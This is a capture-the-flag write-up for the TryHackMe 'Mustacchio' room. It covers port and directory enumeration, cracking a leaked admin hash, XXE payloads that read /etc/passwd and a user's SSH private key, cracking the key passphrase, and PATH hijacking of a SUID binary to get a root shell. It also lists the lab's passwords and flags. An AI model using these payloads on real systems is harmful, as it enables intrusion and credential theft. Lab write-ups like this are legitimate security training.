# Mustacchio

Room: [https://tryhackme.com/room/mustacchio](https://tryhackme.com/room/mustacchio)

---

# Reconnaissance

First, I performed an **Nmap scan** to identify open services on the target machine.

```bash
nmap -sC -sV -T4 -p- -Pn 10.49.130.172 -oN nmap.txt
```

### Scan Result

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu
80/tcp   open  http    Apache httpd 2.4.18
8765/tcp open  ultraseek-http
```

Open ports:

* **22 — SSH**
* **80 — HTTP**
* **8765 — Web service**

To ensure no ports were missed, I also ran **RustScan**, which confirmed the same ports.

---

# Web Enumeration

I visited the web server:

```
http://10.49.130.172
```

Performed basic checks such as:

* Viewing **page source**
* Checking **robots.txt**

However, nothing interesting was discovered initially.

---

# Directory Enumeration

Next, I used **Gobuster** to search for hidden directories.

```bash
gobuster dir -u http://10.49.130.172/ -w /usr/share/wordlists/dirb/big.txt
```

### Result

```
/custom
/images
/fonts
```

The most interesting directory was:

```
/custom
```

Inside this directory, I found a file:

```
users.bak
```

---

# Credential Discovery

Inspecting the file revealed a database backup containing user credentials.

```
admin : 1868e36a6d2b17d4c2745f1659433a54d4bc5f4b
```

I checked the hash on **hashes.com** and found it corresponded to:

```
bulldog19
```

So the credentials were:

```
Username: admin
Password: bulldog19
```

---

# Web Application Login

I then visited:

```
http://10.49.130.172:8765
```

This page contained a **login portal**.
Using the discovered credentials, I successfully logged in.

---

# Hidden File Discovery

While viewing the **page source**, I noticed the following hints:

```
document.cookie = "Example=/auth/dontforget.bak";
```

and

```
<!-- Barry, you can now SSH in using your key! -->
```

Navigating to:

```
/auth/dontforget.bak
```

downloaded a file containing an **XML structure used by the application**.
This revealed how comments were processed by the server.

---

# XXE Vulnerability

Since the application processes **XML input**, it is vulnerable to **XML External Entity (XXE)** attacks.
XXE occurs when an XML parser allows external entities to be processed.
Attackers can exploit this to read local files from the server.

Example:

```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
```
When the entity is referenced in the XML, the server includes the contents of the file.

---

# XXE Exploitation

I crafted the following payload:

```xml
<?xml version="1.0"?>
<!DOCTYPE comment [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<comment>
  <name>&xxe;</name>
  <author>test</author>
  <com>test</com>
</comment>
```
The server returned the contents of `/etc/passwd`, confirming the vulnerability.

---

# Extracting Barry's SSH Key

From `/etc/passwd`, I discovered two users:

```
joe
barry
```

Since the source code hinted that **Barry could SSH using his key**, I attempted to read his private key.

Payload:

```xml
<?xml version="1.0"?>
<!DOCTYPE comment [
<!ENTITY xxe SYSTEM "file:///home/barry/.ssh/id_rsa">
]>
<comment>
  <name>&xxe;</name>
  <author>test</author>
  <com>test</com>
</comment>
```

This successfully returned **Barry's encrypted SSH private key**.

---

# Cracking the SSH Key Passphrase

The key was protected with a passphrase, so I used **John the Ripper**.
First, convert the key to a crackable format:

```bash
ssh2john id_rsa > key
```

Then run John:

```bash
john key --wordlist=/usr/share/wordlists/rockyou.txt
```

### Passphrase

```
urieljames
```

---

# SSH Access

Using the key and passphrase:

```bash
ssh -i id_rsa barry@10.49.130.172
```

Login was successful.

---

# User Flag

Inside Barry's home directory:

```
cat user.txt
```

```
62d77a4d5f97d47c5aa38b3b2651b831
```

---

# Privilege Escalation

I searched for **SUID binaries**.

```bash
find / -perm -4000 -type f 2>/dev/null
```

One unusual binary appeared:

```
/home/joe/live_log
```

Checking permissions:

```
-rwsr-xr-x 1 root root live_log
```

This means the binary runs with **root privileges**.

---

# Analyzing the Binary

Using `strings`:

```bash
strings /home/joe/live_log
```

I found:

```
tail -f /var/log/nginx/access.log
```

This suggests the binary executes:

```
system("tail -f /var/log/nginx/access.log")
```

---

When a program calls another command without specifying its full path, the system searches for the command using the **PATH environment variable**.
Example:

```
tail
```

Instead of:

```
/usr/bin/tail
```

If we place a malicious executable named `tail` earlier in the PATH, the program will execute our malicious version instead.
Since the binary runs as **root (SUID)**, our malicious command will also run as **root**.

---

# Exploiting PATH Hijacking

I created a fake `tail` binary in `/tmp`.

```bash
cd /tmp
echo "/bin/bash -p" > tail
chmod +x tail
```

Then I modified the PATH:

```bash
export PATH=/tmp:$PATH
```

Finally, I executed the vulnerable binary:

```bash
/home/joe/live_log
```

This spawned a **root shell**.

---

# Root Flag

```
cd /root
cat root.txt
```

```
3223581420d906c4dd1a5f9b530393a5
```

DONE!!!!!!
